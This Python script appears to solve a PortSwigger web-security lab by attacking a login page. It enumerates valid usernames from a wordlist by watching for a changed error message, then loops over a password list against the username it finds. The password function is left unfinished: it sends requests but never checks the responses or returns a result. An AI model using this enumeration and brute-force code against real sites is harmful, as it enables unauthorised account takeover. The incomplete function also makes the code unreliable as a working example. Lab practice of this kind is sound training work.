import requests
import sys

def read_list_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def find_valid_username(login_url, usernames):
    for username in usernames:
        response = requests.post(login_url, data={'username': username, 'password': 'a'})
        if 'Invalid username or password.' not in response.text:
            print(f"Valid username found: {username}")
            return username
    return None

def find_valid_password(login_url, username, passwords):
    for password in passwords:
        response = requests.post(login_url, data={'username': username, 'password': password})

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    login_url = burp_url + '/login'

    username_file = '../Portswigger_lists/username_list.txt'
    password_file = '../Portswigger_lists/password_list.txt'

    usernames = read_list_from_file(username_file)
    passwords = read_list_from_file(password_file)

    valid_username = find_valid_username(login_url, usernames)
    if valid_username:
        find_valid_password(login_url, valid_username, passwords)
    else:
        print("No valid username found.")

